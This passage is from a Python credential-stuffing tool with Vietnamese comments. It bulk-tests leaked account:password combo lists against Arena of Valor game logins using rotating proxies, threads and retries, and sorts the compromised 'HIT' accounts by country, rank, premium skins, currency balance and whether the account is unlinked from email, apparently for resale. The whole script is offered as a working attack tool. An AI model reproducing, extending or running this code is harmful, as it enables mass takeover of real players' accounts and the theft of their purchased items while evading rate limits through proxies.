            "country_code": str(h.get("country_code") or "").strip() or "N/A",
            "mobile_no": mobile_no,
            "mobile_binding_status": "Bound" if mobile_bound else "Not Bound",
            "extra_data": {},
        },
        "profile": {
            "avatar": "N/A",
            "signature": "N/A",
            "shell_balance": int(h.get("shells", 0) or 0),
        },
        "status": {
            "account_status": "Active",
            "whitelistable": False,
            "realinfo_updatable": False,
        },
        "binds": binds,
        "game_info": game_info,
        "has_cccd": has_cccd,
        "bind_status": "Clean" if not binds else f"Bound ({', '.join(binds)})",
        "is_clean": len(binds) == 0,
        "login_history": h.get("login_history") if isinstance(h.get("login_history"), list) else [],
        "aov_ban": _hit_build_aov_ban(h),
        "aov_skin": _hit_build_aov_skin(h),
        "topup_time": h.get("topup_time", 0) or 0,
        "last_login": h.get("last_login", ""),
        "tinh_trang": _derive_tinh_trang(h),
        "password_set": bool(h.get("password_set")),
    }

    return {
        "account": f"{acc}:{pw}",
        "details": details,
        "timestamp": time.time(),
        "thread_id": __import__("threading").get_ident() % 1000000,
    }


def _json_one_line(obj) -> str:
    """JSON compact một dòng (mỗi acc = 1 hàng trong account_details.json)."""
    return json.dumps(obj, ensure_ascii=False, separators=(",", ":"))


def _save_hit_json(h: dict):
    """Append 1 dòng JSON/account vào res/account_details.json (JSONL) — queue-based."""
    global _hit_json_loaded
    acc = str(h.get("account", "") or "").strip()
    pw = str(h.get("password", "") or "").strip()
    if not acc or not pw:
        return
    key = f"{acc.lower()}:{pw}"
    path = os.path.join("res", "account_details.json")
    line = _json_one_line(_hit_to_cdm_record(h))

    with _save_lock:
        if not _hit_json_loaded:
            _hit_json_loaded = True
            if os.path.isfile(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        for raw in f:
                            raw = raw.strip()
                            if not raw:
                                continue
                            try:
                                old = json.loads(raw)
                            except json.JSONDecodeError:
                                continue
                            acct = str(old.get("account", "") or "").strip()
                            if acct:
                                if ":" in acct:
                                    a, p = acct.split(":", 1)
                                    _hit_json_keys.add(f"{a.lower()}:{p}")
                                else:
                                    _hit_json_keys.add(acct.lower())
                except Exception:
                    pass
        if key in _hit_json_keys:
            return

    _ensure_save_writer()
    _save_queue.put((path, line, key, _hit_json_keys))


def load_combos(filepath: str):
    combos = []
    seen = set()
    with open(filepath, encoding="utf-8-sig") as f:
        for line in f:
            line = line.strip()
            if not line: continue
            sep = "|" if "|" in line else ":"
            if sep in line:
                p = line.split(sep, 1)
                acc = p[0].strip()
                pw = p[1].strip()
                key = f"{acc}:{pw}"
                if key in seen:
                    continue
                seen.add(key)
                combos.append((acc, pw))
    return combos


def _combo_key_from_res_line(line: str):
    """Pull acc:pw from a saved res line (supports 'user:pass | …' and similar)."""
    s = (line or "").strip()
    if not s or s.startswith("#"):
        return None
    if " | " in s:
        lead = s.split(" | ", 1)[0].strip()
    elif "|" in s:
        lead = s.split("|", 1)[0].strip()
    else:
        lead = s.split()[0] if s.split() else ""
    if ":" not in lead:
        return None
    acc, pw = lead.split(":", 1)
    acc, pw = acc.strip(), pw.strip()
    if not acc or not pw:
        return None
    return f"{acc}:{pw}"


def _save(filename: str, line: str, subdir: str = ""):
    """Queue-based file writer — non-blocking, deduplicated."""
    base = os.path.join("res", subdir) if subdir else "res"
    os.makedirs(base, exist_ok=True)
    path = os.path.join(base, filename)

    def _dedupe_key(raw: str) -> str:
        s = (raw or "").strip()
        if not s:
            return ""
        lead = s.split(" | ", 1)[0].strip()
        if ":" in lead:
            parts = lead.split(":", 1)
            return f"{parts[0].strip().lower()}:{parts[1].strip()}"
        if "||" in s:
            fc_lead = s.split("||", 1)[0]
            if fc_lead.count("|") == 1:
                a, b = fc_lead.split("|", 1)
                a = a.strip()
                b = b.strip()
                if a and b:
                    return f"{a.lower()}:{b}"
        return s.lower()

    # Lazy-init dedupe set
    with _save_lock:
        if path not in _seen_save_keys:
            keys = set()
            if os.path.isfile(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        for old in f:
                            k = _dedupe_key(old)
                            if k:
                                keys.add(k)
                except Exception:
                    pass
            _seen_save_keys[path] = keys

    key = _dedupe_key(line)
    if key and key in _seen_save_keys[path]:
        return

    # Queue write instead of direct file I/O
    _ensure_save_writer()
    _save_queue.put((path, line, key, _seen_save_keys[path]))

def _save_hit_raw(account: str, password: str):
    """Lưu ngay acc:pw vào hit_raw.txt khi check nhanh ra HIT.

    Ghi trước khi fetch_info để đảm bảo không mất account
    nếu bước enrich thất bại.
    """
    _orig_save = globals().get('_save')
    if _orig_save:
        _orig_save("hit_raw.txt", f"{account}:{password}")


def _save_fetch_fail(account: str, password: str):
    """Lưu acc:pw vào fetch_fail.txt khi fetch_info thất bại."""
    _orig_save = globals().get('_save')
    if _orig_save:
        _orig_save("fetch_fail.txt", f"{account}:{password}")


def _save_result(r: dict):
    """Save result into result/ folder based on status and skin tiers."""
    acc_pw = f"{r['account']}:{r['password']}"
    status = r.get("status", "")

    # Bẻ lái toàn bộ logic lưu của nước ngoài để không bị trộn lẫn vào Việt Nam
    is_foreign_aov = bool(r.get('is_th_rov') or r.get('is_tw_aov'))
    foreign_dirname = "AOV_THAILAND" if r.get('is_th_rov') else ("AOV_TAIWAN" if r.get('is_tw_aov') else "")
    _orig_save = globals().get('_save')
    
    def _save(filename: str, line: str, subdir: str = ""):
        if is_foreign_aov:
            if not subdir:
                # Lệnh lưu mặc định (root) sẽ bị bẻ lái sang thư mục riêng của Thái/Đài
                _orig_save(filename, line, subdir=foreign_dirname)
            elif subdir == "rank":
                # Rank vẫn phải ghi — đặt dưới AOV_THAILAND|AOV_TAIWAN/rank/
                _orig_save(filename, line, subdir=os.path.join(foreign_dirname, "rank"))
            else:
                # Bỏ qua các khối lệnh lưu kép (đã gắn subdir khác) để ngăn trùng lặp rác
                pass
        else:
            _orig_save(filename, line, subdir=subdir)

    if status == "HIT":
        if _is_aov_hit_incomplete(r):
            acc_pw_only = f"{r['account']}:{r['password']}"
            note = (
                f"{acc_pw_only} | INCOMPLETE | rank={r.get('aov_rank', '')} | "
                f"skins={((r.get('aov_skins') or {}).get('total_skins', 0))} | "
                f"champs={((r.get('aov_skins') or {}).get('total_champs', 0))} | "
                f"level={_hit_display_aov_level(r)}"
            )
            _orig_save("check_lai.txt", note)
            # Incomplete HIT vẫn là HIT — ghi vào hit_all.txt
            _orig_save("hit_all.txt", acc_pw_only)
            return

        hit_line = _format_hit_line(r)
        tinh_trang = _derive_tinh_trang(r)
        
        # ── 1. Ghi các file trực tiếp trong thư mục res/ ──
        _orig_save("hit.txt", hit_line)
        _orig_save("hit_all.txt", hit_line)  # Tổng hợp mọi HIT (complete + incomplete)
        _save_hit_json(r)
        
        # Cấp độ >= 12
        aov_lv = _hit_display_aov_level(r)
        if aov_lv >= 12:
            _orig_save("acc_lv12_plus.txt", hit_line)
            
        # Sò >= 100
        try:
            so = int(r.get("shells", 0) or 0)
        except Exception:
            so = 0
        if so >= 100:
            _orig_save("acc_100so_plus.txt", hit_line)
            _orig_save("acc_trên100sò.txt", hit_line)
            
        # Dính email
        if tinh_trang == "Acc Dính Mail":
            _orig_save("acc_dinhmail.txt", hit_line)

        # ── 2. Các thư mục con bên trong res/ ──
        ctry = _country_file_key(r)
        country_dir = os.path.join("country", ctry)
        ban_raw = r.get("aov_banned", "NO")
        is_banned = _is_yes(ban_raw)

        # Country folder: hit.txt, acc_trang.txt, acc_dinhmail.txt, acc_trên100sò.txt
        _save("hit.txt", hit_line, subdir=country_dir)
        if tinh_trang == "Acc Trắng":
            _save("acc_trang.txt", hit_line, subdir=country_dir)
        if tinh_trang == "Acc Dính Mail":
            _save("acc_dinhmail.txt", hit_line, subdir=country_dir)
        if so >= 100:
            _save("acc_tren100so.txt", hit_line, subdir=country_dir)
            _save("acc_trên100sò.txt", hit_line, subdir=country_dir)

        # Rank folder (chỉ rank_cao_thu.txt, rank_tinh_anh.txt, rank_cao_thu_{stars}sao.txt)
        rank_raw = _expand_rank_abbrev_for_tier_match((r.get("aov_rank") or "").strip())
        rank_l = rank_raw.lower()
        rank_fold = unicodedata.normalize("NFKD", rank_l).encode("ascii", "ignore").decode("ascii")
        rank_norm = re.sub(r"[^a-z0-9\s]", " ", rank_fold)
        rank_norm = re.sub(r"\s+", " ", rank_norm).strip()

        is_tinh_anh = ("tinh anh" in rank_norm) or bool(re.search(r"\bt\s*anh\b", rank_norm)) or bool(re.search(r"\bt\s*\.\s*anh\b", rank_l)) or ("คอมมานเดอร์" in rank_l) or ("commander" in rank_l) or ("星耀" in rank_l)
        
        is_master = (
            ("cao thủ" in rank_l) or ("cao thu" in rank_l) or
            ("cao thu" in rank_norm) or
            bool(re.search(r"\bmaster\b", rank_norm)) or
            ("คอนเควอร์เรอร์" in rank_l and "ซูพรีม" not in rank_l) or
            ("conqueror" in rank_l and "supreme" not in rank_l) or
            ("戰場傳說" in rank_l) or
            ("chiến tướng" in rank_l) or ("chien tuong" in rank_norm) or ("ซูพรีมคอนเควอร์เรอร์" in rank_l) or ("supreme conqueror" in rank_l) or ("璀璨傳說" in rank_l) or
            ("chiến thần" in rank_l) or ("chien than" in rank_norm) or
            ("thách đấu" in rank_l) or ("thach dau" in rank_norm) or
            ("กลoriasruler" in rank_l) or ("glorious ruler" in rank_l)
        )

        if is_master:
            _save("rank_cao_thu.txt", hit_line, subdir="rank")
            if r.get('aov_rank_stars'):
                stars = int(r.get('aov_rank_stars') or 0)
            else:
                stars = _extract_master_stars(rank_raw)
            if stars > 0:
                _save(f"rank_cao_thu_{stars}sao.txt", hit_line, subdir="rank")
        elif is_tinh_anh:
            _save("rank_tinh_anh.txt", hit_line, subdir="rank")

        # Skin VIP (acc_sss_ss_khong_trang_chua_ban)
        if tinh_trang != "Acc Trắng" and not is_banned:
            sk = r.get("aov_skins") or {}
            try:
                sss_cnt = int(sk.get("sss", 0) or 0)
            except Exception:
                sss_cnt = 0
            try:
                ss_cnt = int(sk.get("ss", 0) or 0)
            except Exception:
                ss_cnt = 0
            if sss_cnt >= 1:
                _save(f"sss_{ctry}.txt", hit_line, subdir="acc_sss_ss_khong_trang_chua_ban")
            if ss_cnt >= 1:
                _save(f"ss_{ctry}.txt", hit_line, subdir="acc_sss_ss_khong_trang_chua_ban")

    elif status == "INVALID":
        _orig_save("die.txt", acc_pw)

    elif status in ("ERROR", "TIMEOUT", "MISS"):
        detail = r.get("detail", "")
        if status == "MISS" and (
            "PREPARE_FAIL result=101" in detail or
            "PREPARE_FAIL result=105" in detail or
            "PREPARE_FAIL result=174" in detail or
            "PREPARE_FAIL result=367" in detail
        ):
            return
        _orig_save("error.txt", acc_pw)

# ── Main ──────────────────────────────────────────────────────────────────────


def _prompt_proxy_file_interactive() -> str:
    """Hỏi file proxy/key. Enter rỗng -> hỏi thêm có dùng KiotProxy (proxy.txt) không."""
    print(
        _c(
            C.DIM,
            "  Gợi ý: gõ tên/đường dẫn file (vd: proxy.txt) — hoặc Enter rồi chọn Y để dùng proxy.txt / KiotProxy.",
        )
    )
    proxy_in = input("Proxy file / key KiotProxy (Enter để bỏ qua): ").strip()
    if proxy_in:
        return proxy_in
    yn = input("Dùng KiotProxy (file key, ví dụ proxy.txt)? [y/N]: ").strip().lower()
    if yn not in ("y", "yes", "c", "co", "1"):
        return ""
    for candidate in ("proxy.txt", os.path.join("combo", "proxy.txt")):
        if os.path.isfile(candidate):
            print(_c(C.GREEN, f"  -> Dùng file: {os.path.abspath(candidate)}"))
            return candidate
    custom = input("Không thấy proxy.txt. Nhập đường dẫn file key/proxy: ").strip()
    return custom

def hoi_proxy():
    """Hỏi người dùng nhập file proxy"""
    print("\n" + "="*60)
    print("  CẤU HÌNH PROXY")
    print("="*60)
    print("1. Bỏ qua (không dùng proxy)")
    print("2. Nhập tên file proxy (vd: proxy.txt)")
    print("3. Nhập trực tiếp key KiotProxy (vd: K0123456789...)")
    print("="*60)
    
    while True:
        chon = input("Nhập lựa chọn (1/2/3): ").strip()
        if chon == "1":
            print("-> Bỏ qua proxy, check trực tiếp\n")
            return None
        elif chon == "2":
            ten_file = input("Nhập tên file proxy: ").strip()
            if os.path.isfile(ten_file):
                print(f"-> Tìm thấy: {ten_file}\n")
                return ten_file
            duong_dan_combo = os.path.join("combo", ten_file)
            if os.path.isfile(duong_dan_combo):
                print(f"-> Tìm thấy: {duong_dan_combo}\n")
                return duong_dan_combo
            print(f"-> Không tìm thấy file: {ten_file}")
            print("   Hãy thử lại hoặc chọn 1 để bỏ qua\n")
        elif chon == "3":
            key = input("Nhập key KiotProxy (bắt đầu bằng chữ K): ").strip()
            if key and key.upper().startswith('K'):
                file_tam = "_proxy_temp.txt"
                with open(file_tam, 'w', encoding='utf-8') as f:
                    f.write(key + "\n")
                    f.write("region=nam\n")
                print(f"-> Đã tạo file tạm: {file_tam}\n")
                return file_tam
            else:
                print("-> Key không hợp lệ! (phải bắt đầu bằng chữ K)\n")
        else:
            print("-> Chọn 1, 2 hoặc 3\n")
def main():
    global _QUIET_BULK
    _print_banner()
    
    # Hardcode lean mode cho tốc độ tối đa
    global _fetch_lean
    _fetch_lean = True
    os.environ["FETCH_LEAN"] = "1"
    
    if not HAS_REQUESTS:
        print(_c(C.YELLOW + C.BOLD, "Thiếu thư viện requests!"))
        print(_c(C.DIM, "  Cài: pip install requests"))
        print()
    
    import threading
    args = sys.argv[1:]

    # Kiểm tra test login
    test_login = any(a in ("--test-login", "-t") for a in args)
    args = [a for a in args if a not in ('--info', '-i', '--test-login', '-t')]

    # ====== TEST LOGIN MODE ======
    if test_login:
        account = input("Account: ").strip()
        password = input("Password: ").strip()
        
        # HỎI PROXY CHO TEST LOGIN
        file_proxy = hoi_proxy()
        proxy = None
        if file_proxy and os.path.isfile(file_proxy):
            load_proxies(file_proxy)
            proxy = _next_proxy()
            if file_proxy == "_proxy_temp.txt":
                try: os.remove(file_proxy)
                except: pass
        
        r = check_login(account, password, fetch_info=True, proxy=proxy, debug=True)
        print(r)
        if r.get("status") == "HIT":
            _save_result(r)
        return

    # ====== BULK MODE (check combo file) ======
    if not args:
        # Menu chính
        print("\n" + "="*60)
        print("  CHỌN CHỨC NĂNG")
        print("="*60)
        print("1. Test login (nhập account/password)")
        print("2. Check combo file (CHỌN FILE BẰNG HỘP THOẠI)")
        print("3. Check combo file (NHẬP ĐƯỜNG DẪN THỦ CÔNG)")
        print("="*60)
        
        mode = input("Nhập số (mặc định 2): ").strip() or "2"

        if mode == "1":
            account = input("Account: ").strip()
            password = input("Password: ").strip()
            print(f"\nĐang test với {account}:{password}")
            
            file_proxy = hoi_proxy()
            proxy = None
            if file_proxy and os.path.isfile(file_proxy):
                load_proxies(file_proxy)
                proxy = _next_proxy()
                if file_proxy == "_proxy_temp.txt":
                    try: os.remove(file_proxy)
                    except: pass

            r = check_login(account, password, fetch_info=True, proxy=proxy, debug=True)
            _print_result(r, verbose=True)
            print(r)
            if r.get("status") == "HIT":
                _save_result(r)
            return

        if mode == "3":
            # Chế độ nhập đường dẫn thủ công
            combo_arg = input("Nhập đường dẫn file combo: ").strip()
            if not os.path.isfile(combo_arg):
                combo_in_folder = os.path.join("combo", combo_arg)
                if os.path.isfile(combo_in_folder):
                    combo_arg = combo_in_folder
                else:
                    print(f"❌ Không tìm thấy file: {combo_arg}")
                    return
        else:
            # Chế độ chọn file bằng hộp thoại (mặc định)
            print("\n📁 Nhấn Enter để mở hộp thoại chọn file combo...")
            input()
            
            combo_arg = select_file_dialog("Chọn file combo (.txt)")
            if not combo_arg:
                print("❌ Chưa chọn file!")
                return
        
        t = input("Số luồng (threads, mặc định 5): ").strip()
        threads = int(t) if t.isdigit() and int(t) > 0 else 5
        
        # HỎI PROXY
        print("\n" + "="*60)
        print("  CẤU HÌNH PROXY")
        print("="*60)
        print("1. Bỏ qua (không dùng proxy)")
        print("2. Chọn file proxy bằng hộp thoại")
        print("3. Nhập tên file proxy thủ công")
        print("4. Nhập trực tiếp key KiotProxy")
        print("="*60)
        
        proxy_choice = input("Nhập lựa chọn (1/2/3/4): ").strip()
        
        file_proxy = None
        if proxy_choice == "2":
            print("\n📁 Nhấn Enter để mở hộp thoại chọn file proxy...")
            input()
            file_proxy = select_file_dialog("Chọn file proxy (.txt)")
            if file_proxy:
                print(f"✅ Đã chọn: {file_proxy}")
        elif proxy_choice == "3":
            file_proxy = input("Nhập tên file proxy: ").strip()
        elif proxy_choice == "4":
            key = input("Nhập key KiotProxy (bắt đầu bằng chữ K): ").strip()
            if key and key.upper().startswith('K'):
                file_proxy = "_proxy_temp.txt"
                with open(file_proxy, 'w', encoding='utf-8') as f:
                    f.write(key + "\n")
                    f.write("region=nam\n")
                print(f"✅ Đã tạo file tạm: {file_proxy}")
        if file_proxy and os.path.isfile(file_proxy):
            args = [combo_arg, str(threads), file_proxy]
        else:
            args = [combo_arg, str(threads)]

    # ====== XỬ LÝ BULK CHECK (phần còn lại giữ nguyên) ======
    combo_arg = args[0] if args else ""
    combo_file = combo_arg if combo_arg and os.path.isfile(combo_arg) else ""
    
    if not combo_file and combo_arg:
        combo_in_folder = os.path.join("combo", combo_arg)
        if os.path.isfile(combo_in_folder):
            combo_file = combo_in_folder

    if combo_file:
        threads = 5
        proxy_file = None
        
        for a in args[1:]:
            if a.isdigit():
                threads = max(1, int(a))
            elif os.path.isfile(a):
                proxy_file = a

        if proxy_file:
            load_proxies(proxy_file)
            nk = len(_kiot_keys)
            ns = len(_proxy_list)
            parts = []
            if ns: parts.append(f"{ns} static")
            if nk: parts.append(f"{nk} KiotProxy")
            if parts:
                print(f"\n✅ Loaded: {', '.join(parts)}")
            else:
                print("\n❌ Không tìm thấy proxy hoặc key hợp lệ!")
            
            if proxy_file == "_proxy_temp.txt":
                try: os.remove(proxy_file)
                except: pass

        combos = load_combos(combo_file)
        _bulk_tune_connections(threads)

        # Lọc acc đã check (bỏ qua fetch_fail/error/check_lai — acc chưa xử lý xong)
        _existing_combos = set()
        _EXCLUDE_RES_FILES = {"fetch_fail.txt", "error.txt", "check_lai.txt"}
        if os.path.isdir("res"):
            for name in os.listdir("res"):
                if not name.lower().endswith(".txt"):
                    continue
                if name.lower() in _EXCLUDE_RES_FILES:
                    continue
                path = os.path.join("res", name)
                if not os.path.isfile(path):
                    continue
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as fp:
                        for line in fp:
                            k = _combo_key_from_res_line(line)
                            if k:
                                _existing_combos.add(k)
                except Exception:
                    pass
        
        original_size = len(combos)
        combos = [(u, p) for (u, p) in combos if f"{u}:{p}" not in _existing_combos]
        filtered = original_size - len(combos)
        if filtered > 0:
            print(f"\nĐã lọc bỏ {filtered} acc đã tồn tại trong res/")
        
        total = len(combos)
        if total == 0:
            print("Không còn acc mới để check.")
            return
            
        print(f"\nLoaded {total} combos | threads={threads}")
        if threads > 50:
            print(_c(C.YELLOW, f"  [!] Cảnh báo: threads={threads} có thể gây lỗi cổng mạng"))

        hits_lock = threading.Lock()
        _stats = {
            'done': 0, 'total': total, 'hits': 0,
            'invalid': 0, 'not_found': 0, 'error': 0,
            'miss_skip': 0, 'captcha': 0, 'other': 0,
            'white_hits': 0, 'white_shells': 0,
            'incomplete': 0,
        }
        _started_at = time.time()
        _print_throttle = [0.0]
        _QUIET_BULK = True

        _SKIP_MISS = ('result=101', 'result=105', 'result=174', 'result=367')

        def _worker(entry):
            idx, acc, pw = entry
            r = None
            is_skip_miss = False
            try:
                # Phase 1: Login nhanh (không fetch_info)
                proxy = _next_proxy()
                r = check_login(acc, pw, timeout=5, fetch_info=False, proxy=proxy)
                is_skip_miss = (
                    r['status'] == 'MISS' and
                    any(code in r.get('detail', '') for code in _SKIP_MISS)
                )

                # Smart retry: chỉ retry network errors
                if r['status'] in ('TIMEOUT', 'PROXY_FAIL', 'CAPTCHA', 'ERROR'):
                    for attempt in range(1, max(1, BULK_MAX_ATTEMPTS)):
                        proxy = _next_proxy()
                        r = check_login(acc, pw, timeout=5, fetch_info=False, proxy=proxy)
                        is_skip_miss = (
                            r['status'] == 'MISS' and
                            any(code in r.get('detail', '') for code in _SKIP_MISS)
                        )
                        if r['status'] not in ('TIMEOUT', 'PROXY_FAIL', 'CAPTCHA', 'ERROR'):
                            break
                        sleep_time = BULK_RETRY_SLEEP * (2 ** (attempt - 1))
                        time.sleep(min(sleep_time, 1.0))

                # Mark proxy health (ngoài hits_lock)
                actual_proxy = r.get('_proxy_used') or proxy if 'proxy' in dir() else None
                if actual_proxy:
                    _mark_proxy_health(actual_proxy, r)

                # Phase 2: Chỉ fetch_info khi HIT
                if r['status'] == 'HIT':
                    _save_hit_raw(acc, pw)
                    if not _is_aov_hit_incomplete(r):
                        try:
                            proxy2 = _next_proxy()
                            r2 = check_login(acc, pw, timeout=9, fetch_info=True, proxy=proxy2)
                            if r2['status'] == 'HIT':
                                r = r2
                                actual_p2 = r2.get('_proxy_used') or proxy2
                                if actual_p2:
                                    _mark_proxy_health(actual_p2, r2)
                            else:
                                _save_fetch_fail(acc, pw)
                        except Exception:
                            _save_fetch_fail(acc, pw)

            except Exception:
                r = {"account": acc, "password": pw, "status": "ERROR", "detail": "WORKER_EXCEPTION"}

            # Update stats
            with hits_lock:
                _stats['done'] += 1
                if r['status'] == 'HIT':
                    if _is_aov_hit_incomplete(r):
                        _stats['incomplete'] += 1
                    else:
                        _stats['hits'] += 1
                    if _derive_tinh_trang(r) == 'Acc Trắng' and not _is_aov_hit_incomplete(r):
                        _stats['white_hits'] += 1
                        try:
                            _stats['white_shells'] += int(r.get('shells', 0) or 0)
                        except Exception:
                            pass
                elif r['status'] == 'INVALID':
                    _stats['invalid'] += 1
                elif r['status'] == 'NOT_FOUND':
                    _stats['not_found'] += 1
                elif is_skip_miss:
                    _stats['miss_skip'] += 1
                elif r['status'] == 'CAPTCHA':
                    _stats['captcha'] += 1
                elif r['status'] in ('ERROR', 'TIMEOUT', 'MISS'):
                    _stats['error'] += 1
                else:
                    _stats['other'] += 1
                snap = dict(_stats)

            # Print status mỗi 0.35s thay vì mỗi acc
            now_ts = time.time()
            if now_ts - _print_throttle[0] > 0.35:
                _print_throttle[0] = now_ts
                with _print_lock:
                    _print_bulk_status(snap, _started_at)
            _save_result(r)
        # -- Background refresh for KiotProxy (every 60s) --
        _refresh_stop = False
        def _refresh_loop():
            while not _refresh_stop:
                time.sleep(60)
                if not _refresh_stop:
                    try:
                        _refresh_rotating_proxies()
                    except Exception:
                        pass

        _refresh_thread_bulk = None
        if _kiot_keys:
            _refresh_thread_bulk = __import__('threading').Thread(target=_refresh_loop, daemon=True)
            _refresh_thread_bulk.start()

        # Đảm bảo flush file writer trước khi bắt đầu
        _ensure_save_writer()

        # Pre-warm proxy pool: resolve 1 lần trước khi bắt đầu
        if _kiot_keys:
            _resolve_all_proxies()

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                ex.map(_worker, ((i + 1, a, p) for i, (a, p) in enumerate(combos)))
        finally:
            _refresh_stop = True
            _QUIET_BULK = False
            # Flush save queue
            try:
                _save_queue.put(None, timeout=2)
            except Exception:
                pass

        hits_total = _stats['hits']
        incomplete_total = _stats.get('incomplete', 0)
        white_hits_total = _stats.get('white_hits', 0)
        white_shells_total = _stats.get('white_shells', 0)
        print()
        print(_c(C.CYAN + C.BOLD, f"\n{'═'*50}"))
        print(_c(C.GREEN + C.BOLD, f"  ✔  DONE: {hits_total} HIT / {total} accounts"))
        if incomplete_total:
            print(_c(C.YELLOW + C.BOLD, f"  ⚠  THIẾU CẤP (check lại): {incomplete_total} → res/check_lai.txt"))
        print(_c(C.YELLOW + C.BOLD, f"  ✔  ACC TRẮNG: {white_hits_total} | TỔNG SÒ: {white_shells_total}"))
        print(_c(C.CYAN + C.BOLD, f"{'═'*50}"))
        return

    # Single check mode
    if len(args) < 2:
        print("Cách dùng:")
        print("  python check.py <tai_khoan> <mat_khau>")
        print("  python check.py <file_combo.txt> [so_luong_threads] [file_proxy.txt]")
        print("  python check.py --test-login")
        return
        
    account = args[0]
    password = args[1]
    
    # HỎI PROXY CHO SINGLE CHECK
    file_proxy = hoi_proxy()
    proxy = None
    if file_proxy and os.path.isfile(file_proxy):
        load_proxies(file_proxy)
        proxy = _next_proxy()
        if file_proxy == "_proxy_temp.txt":
            try: os.remove(file_proxy)
            except: pass
    
    print(f"\nChecking {account}...")
    r = check_login(account, password, fetch_info=True, proxy=proxy)
    _print_result(r, verbose=True)
    _save_result(r)
    if r["status"] == "HIT":
        print("  -> Đã lưu vào thư mục res/")
        
if __name__ == "__main__":
    main()
